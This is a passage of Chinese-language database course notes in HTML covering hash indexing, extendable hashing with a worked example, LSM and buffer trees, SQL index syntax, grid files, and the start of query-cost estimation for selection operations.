<p>尽管可以通过优化来降低桶溢出的概率，但无法完全消除；通常通过使用溢出桶来处理桶溢出问题。</p>
<p>溢出桶是用于存储那些无法放入原始桶中的记录的额外存储单元。通过这种方式，即使发生桶溢出，记录仍然可以被有效地存储和访问。</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-11.png" width="500" />

<figcaption>溢出桶示意图</figcaption>
</figure>
<h3 id="note-db-indexing-hash-indexing">Hash Indexing<a class="headerlink" href="#note-db-indexing-hash-indexing" title="Permanent link">&para;</a></h3>
<p>哈希不仅可以用于文件组织，还可以用于索引结构的创建。哈希索引将搜索键及其关联的记录指针组织成一个哈希文件结构。</p>
<p>严格来说，如果文件本身是使用哈希组织的，那么在其上使用相同搜索键的单独主哈希索引是没有必要的，因此哈希索引总是作为辅助索引。然而，我们使用“哈希索引”一词来指代辅助索引结构和哈希组织的文件。</p>
<p>哈希索引的优点在于其快速的查找速度，因为它可以直接通过哈希函数定位到相应的桶，从而快速访问记录。这使得哈希索引在处理大量数据时非常高效，尤其是在需要频繁查找的场景中。</p>
<p>然而，哈希索引也有其局限性，例如在处理范围查询时效率较低，因为哈希索引不维护数据的顺序。此外，哈希索引在处理动态数据集时可能需要重新哈希以适应数据的增长。</p>
<p>总的来说，哈希索引是一种强大的工具，适用于需要快速查找的应用场景，但在选择使用时需要考虑其局限性和适用性。</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-12.png" width="500" />

<figcaption>哈希索引</figcaption>
</figure>
<h2 id="note-db-indexing-dynamic-hashing">Dynamic Hashing<a class="headerlink" href="#note-db-indexing-dynamic-hashing" title="Permanent link">&para;</a></h2>
<p>在静态哈希中，哈希函数 h 将搜索键值映射到固定数量的桶地址集合 B 中。然而，随着时间的推移，数据库会增长。如果初始的桶数量过少，性能会因为过多的溢出而下降。如果预期未来文件的大小并相应地分配桶的数量，则最初会浪费大量空间。如果数据库缩小，空间也会被浪费。一个选择是定期使用新的哈希函数重新组织文件，但这非常昂贵。</p>
<p>这些问题可以通过使用允许动态修改桶数量的技术来避免。</p>
<p>动态哈希技术包括：</p>
<ul>
<li>
<p><strong>扩展哈希</strong>：通过使用目录来管理桶，目录的大小可以动态增长或缩小。每个目录项指向一个桶，哈希函数的结果用于索引目录。这样可以在不重新组织整个文件的情况下增加或减少桶的数量。</p>
</li>
<li>
<p><strong>线性哈希</strong>：通过逐步增加桶的数量来处理文件的增长，而不是一次性增加。线性哈希使用一个增量的方式来分配新的桶，并在需要时重新分配现有记录。</p>
</li>
</ul>
<p>动态哈希的优点在于它能够适应数据库的增长和缩小，避免了静态哈希中常见的空间浪费和性能下降问题。通过动态调整桶的数量，动态哈希可以在保持高效查找性能的同时，优化存储空间的使用。</p>
<p>然而，动态哈希也有其复杂性，例如需要额外的机制来管理桶的动态变化，并且在某些情况下可能会引入额外的计算开销。</p>
<h3 id="note-db-indexing-extendable-hashing">Extendable Hashing<a class="headerlink" href="#note-db-indexing-extendable-hashing" title="Permanent link">&para;</a></h3>
<p>可扩展哈希是一种动态哈希技术，适用于大小不断变化的数据库。它允许动态修改哈希函数，并通过使用目录来管理桶的地址。</p>
<p>在可扩展哈希中，哈希函数生成一个大范围的值，通常是 <span class="arithmatex">\(b\)</span> 位整数，<span class="arithmatex">\(b = 32\)</span>。在任何时候，只使用哈希函数的前缀来索引桶地址表。前缀的长度为 <span class="arithmatex">\(i\)</span> 位，<span class="arithmatex">\(0 \leq i \leq 32\)</span>。桶地址表的大小为 <span class="arithmatex">\(2^i\)</span>。最初，<span class="arithmatex">\(i = 0\)</span>。</p>
<p>随着数据库的增长和缩小，<span class="arithmatex">\(i\)</span> 的值也会相应地增长和缩小。桶地址表中的多个条目可能指向同一个桶。因此，实际的桶数量小于 <span class="arithmatex">\(2^i\)</span>。由于桶的合并和分裂，桶的数量也会动态变化。</p>
<p>这种方法的优点在于它能够灵活地适应数据库的变化，避免了静态哈希中常见的空间浪费和性能下降问题。通过动态调整桶的数量和哈希函数的前缀长度，可扩展哈希在保持高效查找性能的同时，优化了存储空间的使用。</p>
<p>然而，可扩展哈希也需要额外的机制来管理桶的动态变化，并且在某些情况下可能会引入额外的计算开销。</p>
<p>每个桶 <span class="arithmatex">\(j\)</span> 存储一个值 <span class="arithmatex">\(i_j\)</span>；所有指向同一桶的条目在前 <span class="arithmatex">\(i_j\)</span> 位上具有相同的值。</p>
<p>要定位包含搜索键 <span class="arithmatex">\(K_j\)</span> 的桶：</p>
<ol>
<li>计算 <span class="arithmatex">\(h(K_j) = X\)</span></li>
<li>使用 <span class="arithmatex">\(X\)</span> 的前 <span class="arithmatex">\(i\)</span> 个高位作为桶地址表中的位移，并跟随指针到达适当的桶</li>
</ol>
<p>要插入具有搜索键值 <span class="arithmatex">\(K_j\)</span> 的记录：</p>
<ol>
<li>按照与查找相同的过程，定位桶 <span class="arithmatex">\(j\)</span>。</li>
<li>如果桶 <span class="arithmatex">\(j\)</span> 中有空间，则将记录插入桶中。</li>
<li>否则，必须分裂桶并重新尝试插入。
4 在某些情况下使用溢出桶</li>
</ol>
<p><strong>分裂桶 j 时插入搜索键值为 <span class="arithmatex">\(K_j\)</span> 的记录</strong>：
  - 如果 <span class="arithmatex">\(i &gt; i_j\)</span>（多个指针指向桶 <span class="arithmatex">\(j\)</span>）：
        - 分配一个新桶 <span class="arithmatex">\(z\)</span>，并将 <span class="arithmatex">\(i_j\)</span> 和 <span class="arithmatex">\(i_z\)</span> 设置为旧的 <span class="arithmatex">\(i_j + 1\)</span>。
        - 将桶地址表中指向 <span class="arithmatex">\(j\)</span> 的后一半条目改为指向 <span class="arithmatex">\(z\)</span>。
        - 移除并重新插入桶 <span class="arithmatex">\(j\)</span> 中的每个记录。
        - 重新计算 <span class="arithmatex">\(K_j\)</span> 的新桶，并将记录插入该桶（如果桶仍然满，则需要进一步分裂）。</p>
<ul>
<li>如果 <span class="arithmatex">\(i = i_j\)</span>（只有一个指针指向桶 <span class="arithmatex">\(j\)</span>）：
        - 增加 <span class="arithmatex">\(i\)</span> 并将桶地址表的大小加倍。
        - 将表中的每个条目替换为两个指向同一桶的条目。
        - 重新计算 <span class="arithmatex">\(K_j\)</span> 的新桶地址表条目。
        - 现在 <span class="arithmatex">\(i &gt; i_j\)</span>，因此使用上述第一种情况。</li>
</ul>
<p><strong>溢出桶的创建</strong>：</p>
<ul>
<li>当插入一个值时，如果经过多次分裂后桶仍然满（即 <span class="arithmatex">\(i\)</span> 达到某个限制 <span class="arithmatex">\(b\)</span>），则创建一个溢出桶，而不是进一步分裂桶地址表。</li>
</ul>
<p><strong>删除键值</strong>：
- 定位键值所在的桶并将其删除。
- 如果桶变为空，则可以删除该桶（同时适当更新桶地址表）。
- 桶的合并可以进行（仅能与具有相同 <span class="arithmatex">\(i_j\)</span> 值和相同 <span class="arithmatex">\(i_j - 1\)</span> 前缀的“伙伴”桶合并，如果存在的话）。
- 也可以减少桶地址表的大小。</p>
<p>接下来通过一个例子来理解可扩展哈希的插入过程：</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-13.png" width="500" />

<figcaption>假设通过brachName来hash，桶大小为2</figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/DB/img/index-15.png" width="500" />

<figcaption>一开始深度为0，只有一个bucket</figcaption>
</figure>
<figure>
<img alt="" src="../NOTE/DB/img/index-14.png" width="500" />

<figcaption>insertion of one Brighton and two Downtown records</figcaption>
</figure>
<p>插入brighton时，hash结果为0(mod <span class="arithmatex">\(2^0\)</span>)，插入到bucket0中，深度为0，全局和局部深度一样；</p>
<p>插入第一个Downtown时，hash结果为0,也插入bucket0，此时桶满了；</p>
<p>插入第二个Downtown时，hash结果为0，放不下了，此时全局深度需要+1，分裂成两个桶bucket0和bucket1，全局深度<span class="arithmatex">\(i\)</span>为1，局部深度<span class="arithmatex">\(i_j\)</span>为1，将两个downtown插入bucket1，Brighton插入bucket0；此时bucket1也满了</p>
<p>此时目录表为0和1</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-16.png" width="500" />

<figcaption>insertion of one Mianus record</figcaption>
</figure>
<p>接下来插入Mianus时，第一位为1，想插入bucket1，但是bucket1满了，此时需要分裂bucket1，全局深度<span class="arithmatex">\(i\)</span>为2，将bucket1分裂成bucket10和bucket11，将Mianus插入bucket11，</p>
<p>此时目录表为00,01,10,11；其中00,01指向bucket0，因为其深度仍然还是1(<span class="arithmatex">\(i&gt;i_j\)</span>)，10,11指向bucket10和11，因为其深度为2(<span class="arithmatex">\(i=i_j\)</span>)</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-17.png" width="500" />

<figcaption>insertion of 3 perryridge records</figcaption>
</figure>
<p>接下来插入三个perryridge时，其对应Hash值为1111，第一个正常进入11，第二个需要分裂，全局深度<span class="arithmatex">\(i\)</span>为3，将11分裂成110和111，将第一第二个perryridge插入111，第三个perryridge插入时发现又满了，假设此时分裂达到了阈值，那么创建一个溢出桶存放第三个；</p>
<p>此时目录表为000,001,010,011,100,101,110,111；其中000,001,010,011指向bucket0，因为其深度仍然还是1(<span class="arithmatex">\(i&gt;i_j\)</span>)，100,101指向bucket10，因为其深度为2(<span class="arithmatex">\(i&gt;i_j\)</span>)，110,111指向bucket110和111，因为其深度为3(<span class="arithmatex">\(i=i_j\)</span>)；</p>
<p>最后插入Redwood and Round Hill records,直接根据索引插入即可；</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-18.png" width="500" />

<figcaption>insertion of 2 Redwood and 2 Round Hill records</figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">Ordered Indexing VS. Hashing</p>
<p>在选择索引方法时，需要考虑以下几个因素：</p>
<ol>
<li>
<p><strong>周期性重组的成本</strong>：在某些情况下，索引可能需要定期重组以保持其效率。重组的成本可能会影响索引方法的选择。</p>
</li>
<li>
<p><strong>插入和删除的相对频率</strong>：如果插入和删除操作频繁，可能需要选择一种能够高效处理这些操作的索引方法。</p>
</li>
<li>
<p><strong>优化平均访问时间与最坏情况访问时间的权衡</strong>：在某些应用中，可能需要在优化平均访问时间和最坏情况访问时间之间进行权衡。</p>
</li>
<li>
<p><strong>预期的查询类型</strong>：</p>
<ul>
<li><strong>哈希索引</strong>：通常在检索具有指定键值的记录时表现更好。</li>
<li><strong>有序索引</strong>：如果范围查询很常见，则有序索引更为合适。</li>
</ul>
</li>
</ol>
</div>
<h2 id="note-db-indexing-write-optimized-indexing">Write-Optimized Indexing<a class="headerlink" href="#note-db-indexing-write-optimized-indexing" title="Permanent link">&para;</a></h2>
<h3 id="note-db-indexing-lsm-tree">LSM Tree<a class="headerlink" href="#note-db-indexing-lsm-tree" title="Permanent link">&para;</a></h3>
<p>在写优化索引中，LSM树（Log-Structured Merge-Tree）是一种常用的数据结构。其基本思想是将记录首先插入到内存中的树（L0树）中。</p>
<p>当内存树满时，记录会被移动到磁盘上的树（L1树）。L1树通过自底向上的构建方式，合并现有的L1树和来自L0树的记录，构建B+-树。</p>
<p>当L1树超过某个阈值时，会合并到L2树中。以此类推，更多的层级可以继续扩展。对于每一层级Li+1树，其大小阈值是Li树大小阈值的k倍。</p>
<p>这种结构的优点在于，它能够有效地处理大量的写操作，同时在读取时通过合并的B+-树提供高效的查询性能。</p>
<p><strong>LSM方法的优点</strong>
- 插入操作仅使用顺序I/O操作
- 叶子节点是满的，避免了空间浪费
- 与普通B+-树相比，每条记录插入所需的I/O操作次数减少（在某个大小范围内）</p>
<p><strong>LSM方法的缺点</strong>
- 查询需要搜索多个树
- 每个层级的内容会被多次复制</p>
<h3 id="note-db-indexing-stepped-merge-index">Stepped-Merge Index<a class="headerlink" href="#note-db-indexing-stepped-merge-index" title="Permanent link">&para;</a></h3>
<p>Stepped-Merge Index是LSM树的一种变体，每个层级有多个树。
- 相较于LSM树，写入成本降低
- 但查询成本更高
- 使用布隆过滤器来避免在大多数树中进行查找</p>
<h3 id="note-db-indexing-insertion-and-deletion">Insertion and Deletion<a class="headerlink" href="#note-db-indexing-insertion-and-deletion" title="Permanent link">&para;</a></h3>
<p>在LSM树中，删除操作通过添加特殊的“删除”条目来处理。查找操作会找到原始条目和删除条目，并且必须仅返回那些没有匹配删除条目的条目。当树合并时，如果发现删除条目与原始条目匹配，则两者都会被删除。</p>
<p>更新操作通过插入+删除来处理。</p>
<p>LSM树最初是为基于磁盘的索引引入的，但在基于闪存的索引中也很有用，因为它们可以最大限度地减少擦除操作。LSM树的阶梯合并变体在许多大数据存储系统中使用，例如Google BigTable、Apache Cassandra、MongoDB，以及最近的SQLite4、LevelDB和MySQL的MyRocks存储引擎。</p>
<h3 id="note-db-indexing-buffer-tree">Buffer Tree<a class="headerlink" href="#note-db-indexing-buffer-tree" title="Permanent link">&para;</a></h3>
<p>Buffer Tree是一种B+-树的变体，其关键思想是在每个内部节点中设置一个缓冲区以存储插入操作。当缓冲区满时，插入操作会被移动到更低的层级。通过使用较大的缓冲区，每次可以将许多记录移动到更低的层级，从而相应地减少每条记录的I/O操作。</p>
<p><strong>Buffer Tree的优点</strong></p>
<ul>
<li>查询的开销较小</li>
<li>可以与任何树索引结构结合使用</li>
<li>在PostgreSQL的通用搜索树（GiST）索引中使用</li>
</ul>
<p><strong>Buffer Tree的缺点</strong>
- 比LSM树有更多的随机I/O操作</p>
<figure>
<img alt="" src="../NOTE/DB/img/index-19.png" width="500" />

<figcaption>Buffer Tree</figcaption>
</figure>
<h2 id="note-db-indexing-index-definition-in-sql">Index Definition in SQL<a class="headerlink" href="#note-db-indexing-index-definition-in-sql" title="Permanent link">&para;</a></h2>
<p>SQL提供了创建和删除索引的语法，使数据库管理员和开发人员能够优化查询性能。</p>
<h3 id="note-db-indexing-create-index">Create Index<a class="headerlink" href="#note-db-indexing-create-index" title="Permanent link">&para;</a></h3>
<p>基本语法：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-indexing-__codelineno-1-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="o">&lt;</span><span class="err">索引名</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">&lt;</span><span class="err">表名</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="err">属性列表</span><span class="o">&gt;</span><span class="p">);</span>
</span></code></pre></div>
<p>Example:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-db-indexing-__codelineno-2-1"></a><span class="c1">-- 在branch表的branch-name列上创建索引</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-db-indexing-__codelineno-2-2"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">b</span><span class="o">-</span><span class="k">index</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">branch</span><span class="p">(</span><span class="n">branch</span><span class="o">-</span><span class="n">name</span><span class="p">);</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-db-indexing-__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-db-indexing-__codelineno-2-4"></a><span class="c1">-- 创建多列索引</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-db-indexing-__codelineno-2-5"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">cust</span><span class="o">-</span><span class="n">strt</span><span class="o">-</span><span class="n">city</span><span class="o">-</span><span class="k">index</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">customer</span><span class="p">(</span><span class="n">customer</span><span class="o">-</span><span class="n">city</span><span class="p">,</span><span class="w"> </span><span class="n">customer</span><span class="o">-</span><span class="n">street</span><span class="p">);</span>
</span></code></pre></div></p>
<h3 id="note-db-indexing-create-unique-index">Create Unique Index<a class="headerlink" href="#note-db-indexing-create-unique-index" title="Permanent link">&para;</a></h3>
<p>通过创建唯一索引，可以间接指定并强制执行搜索键是候选键的条件：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-db-indexing-__codelineno-3-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="o">&lt;</span><span class="err">索引名</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">&lt;</span><span class="err">表名</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="err">属性列表</span><span class="o">&gt;</span><span class="p">);</span>
</span></code></pre></div>
<p>Example:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-db-indexing-__codelineno-4-1"></a><span class="c1">-- 在account表的account-number列上创建唯一索引</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-db-indexing-__codelineno-4-2"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">UNIQUE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">uni</span><span class="o">-</span><span class="n">acnt</span><span class="o">-</span><span class="k">index</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">account</span><span class="p">(</span><span class="n">account</span><span class="o">-</span><span class="nb">number</span><span class="p">);</span>
</span></code></pre></div></p>
<p><strong>注意</strong>：如果SQL已经支持唯一性完整性约束（通过<code>UNIQUE</code>关键字），则不一定需要使用唯一索引。</p>
<h3 id="note-db-indexing-drop-index">Drop Index<a class="headerlink" href="#note-db-indexing-drop-index" title="Permanent link">&para;</a></h3>
<p>语法：
<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-db-indexing-__codelineno-5-1"></a><span class="k">DROP</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="o">&lt;</span><span class="err">索引名</span><span class="o">&gt;</span><span class="p">;</span>
</span></code></pre></div></p>
<h3 id="note-db-indexing-other-index-options">Other Index Options<a class="headerlink" href="#note-db-indexing-other-index-options" title="Permanent link">&para;</a></h3>
<p>根据不同的数据库管理系统，创建索引时可能还有其他选项，如：</p>
<ul>
<li>指定索引类型（B+树、哈希等）</li>
<li>指定聚集索引（Clustered Index）或非聚集索引（Non-Clustered Index）</li>
<li>设置填充因子（Fill Factor）</li>
<li>包含额外的列（INCLUDE子句）</li>
</ul>
<p>例如，在某些数据库系统中：</p>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-db-indexing-__codelineno-6-1"></a><span class="c1">-- 在MySQL中创建B树索引</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-db-indexing-__codelineno-6-2"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_name</span><span class="w"> </span><span class="k">USING</span><span class="w"> </span><span class="n">BTREE</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="k">table_name</span><span class="p">(</span><span class="k">column_name</span><span class="p">);</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-db-indexing-__codelineno-6-3"></a>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#note-db-indexing-__codelineno-6-4"></a><span class="c1">-- 在SQL Server中创建聚集索引</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#note-db-indexing-__codelineno-6-5"></a><span class="k">CREATE</span><span class="w"> </span><span class="n">CLUSTERED</span><span class="w"> </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_name</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="k">table_name</span><span class="p">(</span><span class="k">column_name</span><span class="p">);</span>
</span></code></pre></div>
<p>索引的选择和创建应基于查询模式、数据分布和系统性能要求进行考虑。</p>
<h2 id="note-db-indexing-multiple-key-access">Multiple-Key Access<a class="headerlink" href="#note-db-indexing-multiple-key-access" title="Permanent link">&para;</a></h2>
<h3 id="note-db-indexing-grid-file">Grid File<a class="headerlink" href="#note-db-indexing-grid-file" title="Permanent link">&para;</a></h3>
<p>网格文件（grid file）是一种用于加快处理涉及一个或多个比较运算符的一般性多搜索键查询的结构。
它具有以下特点：
- 拥有一个单一的网格数组，并且针对每个搜索键属性都有一个线性刻度。网格数组的维度数量与搜索键属性的数量相等。例如，如果有两个搜索键属性，那么网格数组就是二维的。</p>
<ul>
<li>网格数组中的多个单元格可以指向同一个存储桶（bucket）。也就是说，不同的单元格可能对应着相同的数据存储位置。</li>
<li>当要为一个搜索键值找到对应的存储桶时，需要使用线性刻度来确定该值所在单元格的行和列，然后顺着单元格的指针就能找到对应的存储桶。</li>
<li>通过这种结构，网格文件可以更高效地处理多搜索键的查询操作，提高数据检索的速度和效率。</li>
</ul>
<p>在插入数据时，如果一个存储桶已满，当有不止一个单元格指向该存储桶时，可以创建一个新的存储桶。这一思路与可扩展散列类似，但应用于多个维度。
如果只有一个单元格指向该已满的存储桶，那么就必须创建一个溢出存储桶，或者增大网格的规模。</p>
<ul>
<li>必须选择合适的线性刻度，以便将记录均匀地分布在各个单元格之间。否则，将会产生过多的溢出存储桶。</li>
<li>定期进行重新组织以增大网格规模会有所帮助。但重新组织的代价可能非常高昂。</li>
<li>网格数组的空间开销可能会很大。</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/index-20.png" width="500" />

<figcaption>Grid File</figcaption>
</figure></section><section class="print-page" id="note-db-query" heading-number="2.2.1.9"><h1 id="note-db-query-query-processing">Query Processing<a class="headerlink" href="#note-db-query-query-processing" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 8135 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 18 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 28 分钟</p>
</div>
<h2 id="note-db-query-measures-of-query-cost">Measures of Query Cost<a class="headerlink" href="#note-db-query-measures-of-query-cost" title="Permanent link">&para;</a></h2>
<p>Cost  is generally measured as total elapsed time for answering query.</p>
<p>影响时间成本的因素有很多，一般而言我们主要关注 Disk Access, CPU Time, Network Traffic.</p>
<p>而 Disk Access 是主导因素，主要考虑以下三个方面</p>
<ul>
<li>Number of Seek operations</li>
<li>Read Cost: Number of blocks read <span class="arithmatex">\(\times\)</span> Average block read cost</li>
<li>Write Cost: Number of blocks written <span class="arithmatex">\(\times\)</span> Average block write cost</li>
</ul>
<p>而Write Cost 一般远大于 Read Cost，因为写完之后还需要从内存中读出来，以确保数据写回的正确性。</p>
<p>为了简化计算，我们使用</p>
<ul>
<li><span class="arithmatex">\(t_T\)</span> Time to transfer a block</li>
<li><span class="arithmatex">\(t_S\)</span> Time for one seek</li>
</ul>
<p>例如，查找<span class="arithmatex">\(b\)</span>个block和<span class="arithmatex">\(s\)</span>次seek的代价为<span class="arithmatex">\(b t_T + s t_S\)</span></p>
<div class="admonition note">
<p class="admonition-title">内存缓冲区对查询成本的影响</p>
<p>查询成本很大程度上取决于主内存中缓冲区的大小：</p>
<ul>
<li>更多的内存可以减少对磁盘访问的需求</li>
<li>实际可用于缓冲的内存大小取决于其他并发的操作系统进程，这很难在实际执行前确定</li>
<li>我们通常使用最坏情况估计，假设只有操作所需的最小内存可用</li>
<li>同时也会考虑最佳情况估计</li>
</ul>
<p>需要注意的是，所需数据可能已经在缓冲区中，这样可以避免磁盘I/O。但这种情况很难在成本估算中准确考虑。</p>
</div>
<h2 id="note-db-query-selection-operation">Selection Operation<a class="headerlink" href="#note-db-query-selection-operation" title="Permanent link">&para;</a></h2>
<h3 id="note-db-query-file-scan">File Scan<a class="headerlink" href="#note-db-query-file-scan" title="Permanent link">&para;</a></h3>
<p>文件扫描是一种 <strong>不使用索引</strong> 的搜索算法，用于定位和检索满足选择条件的记录。</p>
<h3 id="note-db-query-a1-linear-search">A1 - Linear Search<a class="headerlink" href="#note-db-query-a1-linear-search" title="Permanent link">&para;</a></h3>
<p>线性搜索是最基本的选择操作实现方法：</p>
<p><strong>算法 A1（线性搜索）</strong>：</p>
<ul>
<li>
<p>扫描每个文件块并测试所有记录，检查它们是否满足选择条件</p>
</li>
<li>
<p>成本估计 = <span class="arithmatex">\(b_r\)</span> 次 block transfer + 1 次 seek</p>
</li>
<li><span class="arithmatex">\(b_r\)</span> 表示包含关系 <span class="arithmatex">\(r\)</span> 中记录的块数</li>
<li>如果选择条件是基于键属性，找到记录后可以停止</li>
<li>成本 = <span class="arithmatex">\((b_r/2)\)</span> 次 block transfer + 1 次 seek,这是平均的成果，具体来说，我们找到第一个满足条件的记录就可以返回了，因为它是唯一的；最好的情况是<span class="arithmatex">\(b_r=1\)</span>，最坏的情况是<span class="arithmatex">\(b_r=b\)</span>，由于目标文件是随机存储的，所以期望就是就是<span class="arithmatex">\(b_r/2\)</span></li>
</ul>
<p>1次Seek是因为将磁头移动到目标块，然后依次往下面走就行</p>
<ul>
<li>线性搜索可以应用于任何选择条件、任何文件记录排序方式，不需要索引</li>
</ul>
<h3 id="note-db-query-a2-binary-search">A2 - Binary Search<a class="headerlink" href="#note-db-query-a2-binary-search" title="Permanent link">&para;</a></h3>
<ul>
<li>适用条件：选择是一个等值比较（equality comparison），且文件按该属性排序</li>
<li>
<p>假设关系的块是连续存储的</p>
</li>
<li>
<p>成本 = <span class="arithmatex">\(\lceil\log_2(b_r)\rceil\)</span> 次 block transfer + <span class="arithmatex">\(\lceil\log_2(b_r)\rceil\)</span> 次 seek（定位第一个元组的成本）二分搜索的工作原理要求每次比较后跳转到文件的不同部分。每次我们需要检查一个新的中间点时，都需要将磁盘头重新定位到一个可能相距较远的新块位置。</p>
</li>
<li>
<p>如果选择不是基于键属性，还需加上包含满足选择条件记录的块数</p>
</li>
<li>block transfer = <span class="arithmatex">\(\lceil\log_2(b_r)\rceil\)</span> + <span class="arithmatex">\(\lceil sc(A, r)/f_r \rceil\)</span> - 1, 其中<span class="arithmatex">\(sc(A, r)\)</span>是满足选择条件的记录数，<span class="arithmatex">\(f_r\)</span>是每个块的记录数当我们知道满足选择条件的记录总数 <span class="arithmatex">\(sc(A, r)\)</span> 时，需要计算这些记录会占用多少个块。所以用记录总数 <span class="arithmatex">\(sc(A, r)\)</span> 除以每块记录数 <span class="arithmatex">\(f_r\)</span>，再向上取整 <span class="arithmatex">\(\lceil sc(A, r)/f_r \rceil\)</span>，就得到了存储这些记录所需的块数。</li>
</ul>
<p>例如，如果有100条记录满足条件，而每个块可以存储25条记录，那么就需要 <span class="arithmatex">\(\lceil 100/25 \rceil = 4\)</span> 个块来存储这些记录。</p>
<p>所以完整的传输成本 = 定位第一个满足条件记录所需的块传输 + 读取所有满足条件记录所需的块数 - 1（减1是因为第一个块已经在定位过程中计算过了）。</p>
<div class="admonition note">
<p class="admonition-title">二分搜索的局限性</p>
<p>二分搜索通常不适用于数据库查询，因为：
- 数据通常不是连续存储的
- 除非有可用的索引，否则二分搜索需要比索引搜索更多的寻道操作</p>
</div>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
